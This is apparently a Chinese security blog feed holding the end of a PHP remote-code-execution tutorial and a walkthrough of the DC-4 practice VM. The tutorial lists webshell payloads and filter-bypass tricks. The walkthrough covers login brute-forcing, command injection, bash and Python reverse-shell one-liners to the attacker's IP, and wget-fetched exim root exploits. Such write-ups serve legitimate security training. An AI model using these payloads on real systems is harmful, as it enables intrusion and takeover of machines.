title="Linux系统"></a>Linux系统</h5><p>windows系统下的命令拼接符均使用于Linux下，此外，Linux还有：</p><blockquote><p><code>;</code>前后命令都执行，执行A后又执行B，或更多条命令。</p></blockquote><h4 id="3、执行函数"><a href="#3、执行函数" class="headerlink" title="3、执行函数"></a>3、执行函数</h4><h5 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h5><blockquote><ul><li><p><code>system()</code>: 执行一个外部的应用程序，并显示输出的结果</p></li><li><p><code>passthru()</code>: 执行一个UNIX系统命令并显示原始的输出</p></li><li><p><code>exec()</code>: 执行一个外部的应用程序，只返回最后一行的结果</p></li><li><p><code>shell_exec()</code>: 执行<code>shell</code>命令并返回 输出的结果的字符串</p></li></ul><p>popen()：用于创建一个管道，通过该管道可以执行一个shell命令并获取其输出。执行示例<code>fp = popen(&quot;ls -l&quot;, &quot;r&quot;);</code></p><p>proc_open(): 用于创建一个新进程，并提供更灵活的控制和通信方式，比如可以指定输入输出流。</p><p>pcntl_exec(): 用于在当前进程中执行一个新的程序，替换当前进程的内容。</p></blockquote><p>常使用的是前面四个！</p><h5 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h5><blockquote><ul><li><p><code>eval()</code>：传入的参数必须是php代码，即需要以分号结尾。例如：<code>cmd=system(whoami)；</code></p></li><li><p><code>assert()</code>：直接将传入的参数当成php代码执行，传入的参数不需要以分号结尾。例如：<code>cmd=system(whoami)</code></p></li><li><p><code>preg_replace()</code>：将目标字符中<code>符合正则规则</code>（自己拟定的）的字符替换为替换字符，此时，如果正则规则中使用<code>/e</code>修饰符，则表示存在代码执行漏洞。例如：<code>preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code>表示函数将根据正则表达式模式（参数一），在参数三中寻找到了与模式匹配的字符串并将其替换为参数二提供的字符串。</p></li></ul><p>有关<code>/e</code>修饰符的解释如下：</p><p>也就是说，在执行替换的过程中，替换字符串会被当成代码解释执行</p><p>但受版本限制，仅适用于PHP版本&lt;5.5.0</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721808910747.png"></p><ul><li><p><code>create_function()</code>：创造匿名函数执行代码，执行命令和上传文件参考eval()函数（必须加分号）。例如：<code>$func=create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);$func();</code>其中，参数一表示函数的参数列表，参数二表示函数体的代码。创建完毕后执行该匿名函数。（$表示变量声明）</p></li><li><p><code>call_user_func()</code>：调用一个回调函数处理字符串。例如：<code>call_user_func(&quot;assert&quot;,$_POST[&#39;cmd&#39;])；</code>其中，参数一是被调用的回调函数，可以是包含函数名的字符串或包含对象引用和方法名的数组。参数二是传递给回调函数的参数，可以有多个，之间使用逗号分隔。</p></li><li><p><code>array_filter()</code>：用回调函数过滤数组中的元素。</p></li></ul></blockquote><h4 id="4、漏洞检测"><a href="#4、漏洞检测" class="headerlink" title="4、漏洞检测"></a>4、漏洞检测</h4><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><blockquote><p>白盒：对代码进行审计</p><p>黑盒：利用漏扫工具、公开的漏洞、手工看功能点及参数值。</p></blockquote><h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><p>整体的检测方式和<strong>命令执行</strong>的是一样的，只是输入的方式不同。</p><h4 id="5、漏洞利用"><a href="#5、漏洞利用" class="headerlink" title="5、漏洞利用"></a>5、漏洞利用</h4><p><a href="https://www.freebuf.com/articles/web/367358.html">RCE代码及命令执行</a></p><p><a href="https://www.freebuf.com/articles/web/395449.html">rce漏洞介绍及其绕过教程</a></p><p><a href="https://blog.csdn.net/m0_73185293/article/details/131557169">RCE漏洞详解及绕过总结(全面)-很多绕过示例</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">总结rce（远程代码执行各种sao姿势）绕过bypass</a></p><p><a href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p><h5 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h5><blockquote><ul><li><strong>空格绕过</strong>：使用<code>$&#123;IFS&#125;</code>、<code>$IFS</code>、<code>+</code>、<code>%09</code>、<code>%0b</code>、<code>$IFS$9</code>、<code>$IFS$1</code>、重定向符<code>&lt;</code>或<code>&lt;&lt;</code>中的一种符合替代空格。例如：cat file -- cat>file</li><li><strong>字符绕过</strong>：</li></ul><p>用 \ 绕过：例如 cat -> c\at</p><p>用 ` 绕过：例如 cat -> 使用两个单引号将 cat 包围封闭起来</p><p>用 '' 绕过：例如 cat -> c''at</p><p>用 $ 绕过(字符拼接法)：例如：flag -> a=f;$alag（如果过滤了<code>;</code>字符串,可以用<code>%0a,%0d,%0D%0A</code>来代替）</p><p>用base编码绕过</p><p>......还有更多的绕过方法参考上述链接1、2、3、4</p></blockquote><h5 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 注入一句话木马<br>?txt=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);    <br>// 获取当前绝对路径<br>?txt=<span class="hljs-built_in">print</span>(_FILE_);      <br>// 读取重要文件<br>?txt=var_dump(file_get_contents(<span class="hljs-string">&#x27;c:\\windows\system32\drivers\etc\hosts&#x27;</span>));    <br>// 写入shell，Getshell<br>?txt=var_dump(file_put_contents(<span class="hljs-variable">$_POST</span>[1],<span class="hljs-variable">$POST</span>[2]));<br>1=shell.php&amp;2=&lt;?php phpinfo()?&gt;   <br></code></pre></td></tr></table></figure><h4 id="6、漏洞危害"><a href="#6、漏洞危害" class="headerlink" title="6、漏洞危害"></a>6、漏洞危害</h4><ul><li>任意命令执行系统命令</li><li>恶意木马被种植</li><li>挂马、钓鱼</li><li>敏感信息泄露</li><li>继承web服务器权限，读写重要文件</li><li>反弹shell</li><li>继承web服务器程序权限，去执行系统命令</li></ul><h4 id="7、漏洞防御"><a href="#7、漏洞防御" class="headerlink" title="7、漏洞防御"></a>7、漏洞防御</h4><p>1、过滤特殊字符或替换字符</p><p>2、严格验证输入的类型长度</p><p>3、使用escapeshellarg()函数处理相关参数</p><p>4、尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行system、eval等命令执行功能的函数前，要先确定参数内容。</p><p>5、尽量避免使用容易产生漏洞的危险函数</p><p>6、对用户的输入做严格的过滤，如白名单过滤</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-4</title>
    <link href="/2024/07/24/DC-4/"/>
    <url>/2024/07/24/DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关目标靶机来确认目标靶机的IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN  192.168.204.0/24<br></code></pre></td></tr></table></figure><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704224901788.png" alt="image-20240704224901788"></p><p>开靶机后：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704224934605.png" alt="image-20240704224934605"></p><p>对比之下可以得到目标靶机的IP地址为：<code>192.168.204.133</code>。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="扫描开放的TCP端口"><a href="#扫描开放的TCP端口" class="headerlink" title="扫描开放的TCP端口"></a>扫描开放的TCP端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.133<br>nmap -sT -p- 192.168.204.133<br></code></pre></td></tr></table></figure><p><code>-sN</code>：表示执行Null扫描，Null扫描是一种TCP扫描技术。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704225650473.png" alt="image-20240704225650473"></p><p>扫描结果显示，开放的端口为<code>22</code>端口和<code>80</code>端口。</p><h3 id="扫描开放的UDP端口"><a href="#扫描开放的UDP端口" class="headerlink" title="扫描开放的UDP端口"></a>扫描开放的UDP端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sU -top-ports 20 -p- 192.168.204.133<br></code></pre></td></tr></table></figure><p><code>-sU</code>：表示执行UDP扫描，UDP不建立连接，所以端口扫描和响应的处理方式不同。</p><p><code>-top-ports</code>：指定扫描的端口数量，该参数后面跟一个数字。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704230408447.png" alt="image-20240704230408447"></p><p>根据<code>STATE</code>字段，我们发现还是有蛮多开放的UDP端口的，但是一般不对UDP端口进行测试，其优先级靠后。</p><h2 id="端口详细信息扫描（tcp）"><a href="#端口详细信息扫描（tcp）" class="headerlink" title="端口详细信息扫描（tcp）"></a>端口详细信息扫描（tcp）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.133<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704231641121.png" alt="image-20240704231641121"></p><p>根据扫描结果，可以得知：</p><blockquote><p>22端口开放的是ssh服务，运行版本为OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)，其中还给出了ssh主机密钥。提示可以进行ssh远程连接。</p><p>80端口开放的是http服务，运行版本是nginx 1.15.10。</p></blockquote><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.133<br></code></pre></td></tr></table></figure><p>这次nmap漏扫的响应时间比较长，得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134104640.png" alt="image-20240705134104640"></p><p>根据结果可知，80端口http服务可能存在着<code>csrf（跨站请求伪造）</code>漏洞。路径为：</p><blockquote><p> <a href="http://192.168.204.133/">http://192.168.204.133:80/</a></p><p> <a href="http://192.168.204.133/login.php">http://192.168.204.133:80/login.php</a></p></blockquote><p>通过网站浏览可以发现这两个网址打开都是相同的登陆界面。为了便于后续漏洞利用，比如植入一句话木马之类的，我们后续均使用<code>http://192.168.204.133:80/login.php</code></p><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><p>访问链接：<code>http://192.168.204.133:80/login.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134633165.png" alt="image-20240705134633165"></p><p>直接就是一个管理信息系统登陆界面。</p><p>使用Wappalyzer查看网页的技术构成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705134758802.png" alt="image-20240705134758802"></p><p>没有得到有关网页框架等相关信息，即，没啥有用信息。</p><p>既然是登陆界面,自然就要想方设法获取合法的管理员登陆账号。可以先做目录爆破看看能否得到一些有用的资源信息。</p><h3 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.133 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705135323268.png" alt="image-20240705135323268"></p><p>似乎没有得到什么有用的信息,访问爆破得到的两个网址:</p><blockquote><p><a href="http://192.168.204.133/images/">http://192.168.204.133/images/</a></p><p><a href="http://192.168.204.133/css/">http://192.168.204.133/css/</a></p></blockquote><p>两个网页的访问响应都是<code>403 Forbidden</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705135444738.png" alt="image-20240705135444738"></p><blockquote><p><code>403 Forbidden</code>:是指在尝试访问网站或特定页面时,服务器拒绝了请求。发生该问题通常是由于以下原因造成的：权限不足、IP地址限制、访问控制列表（ACL）限制、http身份验证失败、目录列表拒绝、内容过滤或防火墙规则。</p></blockquote><p>所以这次目录爆破等于无效爆破，爆破出来的目录访问是被服务器拒绝的。</p><p>目前为止,捋一下思绪。我们通过nmap漏扫发现了网站可能存在<code>csrf漏洞</code>，然后我们通过目录爆破出来的网址链接，访问均被服务器拒绝。通过Wappalyzer分析网页的技术构成，也没有得到有关于网页框架等有用的信息。</p><p>所以,接下来,我们就要以目标网站的csrf漏洞为切入点。</p><h3 id="访问存在csrf漏洞的登陆网页"><a href="#访问存在csrf漏洞的登陆网页" class="headerlink" title="访问存在csrf漏洞的登陆网页"></a>访问存在csrf漏洞的登陆网页</h3><p>使用burpsuite进行抓包检查登陆界面上用户名和密码的传输方式。</p><p>在登陆界面随机输入一些用户名和密码，然后点击“Submit”：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705210622750.png" alt="image-20240705210622750"></p><p>查看burpsuite拦截到的数据包：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705210734505.png" alt="image-20240705210734505"></p><p>得到的信息有：</p><blockquote><p>请求方式为POST，传输方式是明文：username&#x3D;chfhj&amp;password&#x3D;hkjhk</p></blockquote><h3 id="burpsuite爆破"><a href="#burpsuite爆破" class="headerlink" title="burpsuite爆破"></a>burpsuite爆破</h3><p>已知账号密码传输的方式以及明文传输格式，因此可以通过抓包进行账号密码的爆破。仅设置<code>username</code>和<code>password</code>两个payload集合，然后通过用户名字典和密码字典进行爆破。(<a href="http://192.168.204.133/login.php">http://192.168.204.133:80/login.php</a>)</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705212615851.png" alt="image-20240705212615851"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240705213405067.png" alt="image-20240705213405067"></p><p>之后就是设置<code>payload</code>。注意，在前面<code>positions</code>选中了多少个爆破变量位置，后面就要设置多少个<code>payload</code>，set下的数字代表的是position 参数编号。需要按序分别选择然后导入爆破字典。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223514917.png" alt="image-20240706223514917"></p><p>设置完<code>payload</code>之后就可以点击右上角的<code>start attack</code>开始进行攻击。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222807477.png" alt="image-20240706222807477"></p><p>爆破完后（当然也可以是在爆破之前）进行过滤设置。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223951881.png" alt="image-20240706223951881"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706224012970.png" alt="image-20240706224012970"></p><p>设置只显示状态码为2xx系列成功的数据包。</p><p>爆破（花了很长时间）得到用户名和密码：</p><blockquote><p>username：admin     password：happy</p></blockquote><p>但是爆破结果不仅得到了上面的账号和密码，还有其它的爆破成功的用户名密码对：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223251316.png" alt="image-20240706223251316"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706223327065.png" alt="image-20240706223327065"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>使用上述爆破得到的账号密码进行登陆。登陆后的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095837540.png" alt="image-20240706095837540"></p><p>点击“Command”得到如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095909244.png" alt="image-20240706095909244"></p><p>点击“Run”：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706095954196.png" alt="image-20240706095954196"></p><p>有提示信息：<code>You have selected: ls -l</code>，似乎在指示，我们通过前端执行了命令<code> ls -l</code>。尝试抓包看看是否能够更改这条指令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134153866.png" alt="image-20240706134153866"></p><p>可以看到的是，抓取的包以明文的形式显示出了<code>ls -l</code>指令，即<code>ls+-l</code>。尝试修改该指令并进行重放。将其修改为<code>cat index.php</code>即,<code>cat+index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134704114.png" alt="image-20240706134704114"></p><p>然后进行放行! </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706134737052.png" alt="image-20240706134737052"></p><p>ok!成功地执行了我们修改的命令。so！我们就可以通过命令来反弹shell了。</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><ul><li><p>实践gpt上面的反弹shell操作方案</p><p>首先需要现在攻击机进行端口监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nvlp 9999<br>/bin/bash -i &gt;&amp; /dev/tcp/192.168.204.128/9999 0&gt;&amp;1<br>burpsuite编码：<br>/bin/bash%20-i%20%3E%26%20/dev/tcp/192.168.204.128/9999%200%3E%261<br></code></pre></td></tr></table></figure><p>这里的IP地址是攻击机（kali）的IP地址。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706142153965.png" alt="image-20240706142153965"></p><p>好！失败。。。</p><ul><li>编写脚本进行命令注入，进而实现反弹shell</li></ul><p>首先编写反弹脚本：</p><p>设置监听目标IP以及监听端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">import socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((&quot;<span class="hljs-number">192.168</span>.<span class="hljs-number">204.128</span>&quot;,<span class="hljs-number">9999</span>));<br>os.dup2(s.fileno(),0);<br>os.dup2(s.fileno(),1); <br>os.dup2(s.fileno(),2);<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure><p>然后直接在终端命令行执行脚本代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.204.128&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><br>python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="hljs-number">22192.168</span>.<span class="hljs-number">204.128</span>%<span class="hljs-number">22</span>,<span class="hljs-number">9999</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706151934510.png" alt="image-20240706151934510"></p><p>然后放行。反弹成功，获取目标靶机合法用户的登陆权限。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706152723101.png" alt="image-20240706152723101"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看当前具有SUID权限的命令;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706155330709.png" alt="image-20240706155330709"></p><p>其中，可以尝试的提权命令有：</p><blockquote><p>passwd、exim4、mount、su</p></blockquote><p>首先先切换到对方用户登陆的模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>逐一尝试这些可能被提权的命令：</p><blockquote><p><code>passwd</code>：passwd root</p><p><code>mount</code>：mount –o bind &#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;mount</p><p><code>su</code>：su</p><p><code>exim4</code>：</p></blockquote><p>提示无法修改root用户的密码，表明没有root权限，没提权成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706221743698.png" alt="image-20240706221743698"></p><p>提示只有root用户能够使用 <code>--options</code>，表明当前没有提权成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222057830.png" alt="image-20240706222057830"></p><p>提示需要输入密码，后台管理系统的登陆账户密码也不管用。很难通过尝试进行提权。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222458733.png" alt="image-20240706222458733"></p><p>最后是exim4，它的提权难度较大。</p><p>首先先查看exim4的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim4 --version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706224633919.png" alt="image-20240706224633919"></p><blockquote><p>exim4：4.89</p></blockquote><p>明确使用exim4进行提权后，使用<code>searchsploit</code>查询可用于提权的代码文件。</p><p>注意！正常来说，命令应该是exim，不是exim4哦！这么输入会报错的。</p><p>exim4：exim指令的version4。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706225050928.png" alt="image-20240706225050928"></p><p>搜索得到的结果不少哦！一般文件后缀为txt文件的比较容易实现。但是这些实现都需要自己手动按照其指示的方法实现。</p><blockquote><p>linux&#x2F;remote&#x2F;25297.txt</p><p>linux&#x2F;remote&#x2F;46974.txt</p><p>multiple&#x2F;dos&#x2F;43184.txt</p><p>linux&#x2F;local&#x2F;39549.txt</p><p>linux&#x2F;dos&#x2F;23896.txt</p></blockquote><p>仔细一看，我们发现其中有<code>.sh</code>后缀的文件，这些文件一般为shell脚本文件。通过运行命令就可以进行利用的，会比手动实现方法相对节省时间。</p><blockquote><p>linux&#x2F;local&#x2F;796.sh</p><p>linux&#x2F;local&#x2F;39535.sh</p><p>linux&#x2F;local&#x2F;46996.sh</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706225933071.png" alt="image-20240706225933071"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 796.sh<br>searchsploit -m 39535.sh<br>searchsploit -m 46996.sh<br></code></pre></td></tr></table></figure><p>将这三个.sh文件均下载到当前目录下。</p><p>然后将脚本部署到服务器中，并让目标靶机通过<code>wget</code>命令下载该提权脚本进行执行（以目标靶机合法用户的身份以及交互界面下载）。</p><p>当前kali与目标靶机位于同一网段。所以可以在本机（kali）部署<code>apache2</code>服务让目标靶机下载即可。</p><p>首先在本机（kali）启动apache2服务，然后将下载的shell脚本文件复制到 <code>/var/www/html/</code>文件夹下，相当于放到网页上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">cp</span> 796.sh /var/www/html/<br>service apache2 status  //查看状态<br><br><span class="hljs-built_in">cp</span> 39535.sh /var/www/html/<br><span class="hljs-built_in">cp</span> 46996.sh /var/www/html/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232255198.png" alt="image-20240706232255198"></p><p>为了防止某一个脚本提权失败，我们把其它的脚本也复制上去。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706233427682.png" alt="image-20240706233427682"></p><p>然后到目标靶机（目标靶机用户交互界面处），执行下载操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.204.128/796.sh<br>wget http://192.168.204.128/39535.sh<br>wget http://192.168.204.128/46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232619485.png" alt="image-20240706232619485"></p><p>由于权限不够，所以下载操作被拒绝了，无法在当前目录进行写入。</p><blockquote><p>一般情况下，<code>tmp</code>目录都具有相当高的权限。</p></blockquote><p>因此，可以尝试切换到<code>/tmp</code>目录下进行提权脚本的下载。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232913257.png" alt="image-20240706232913257"></p><p>下载成功。把三个都给下载了：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234051092.png" alt="image-20240706234051092"></p><p>然后为下载的脚本加上可执行权限，并执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 796.sh<br>./796.sh<br><br><span class="hljs-built_in">chmod</span> +x 39535.sh<br>./39535.sh<br><br><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh<br></code></pre></td></tr></table></figure><ul><li>.&#x2F;796.sh：发生gcc错误，提权失败。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706233248963.png" alt="image-20240706233248963"></p><ul><li>39535.sh：没有找到exim命令，提权失败。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234322456.png" alt="image-20240706234322456"></p><ul><li>46996.sh：提权成功。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234350082.png" alt="image-20240706234350082"></p><p>查找flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234829075.png" alt="image-20240706234829075"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234846253.png" alt="image-20240706234846253"></p><p>至此，所有工作完成。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次是通过burpsuite进行用户名和密码爆破，然后通过shell注入、反弹shell以及命令提权获取最后的flag。</p><p>但是在之前进行Getshell的时候我们还使用到了ssh远程连接。</p><p>所以对于这个靶场，也可以尝试进行ssh爆破（hydra）。</p><blockquote><p>一般在<code>/home</code>目录下能够找到其他用户的文件夹或者更多信息，也能够从各个文件夹中找到更多信息。</p></blockquote><p>在提权成功后，在<code>/home</code>目录下的jim-backups文件夹中，发现了一个名为<code>old-passwords.bak</code>的文件。</p><p>注意！home目录下的三个文件夹看着很像用户的文件夹。所以在后续进行爆破的时候，用户名字典就从这三个文件夹名入手。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706235128164.png" 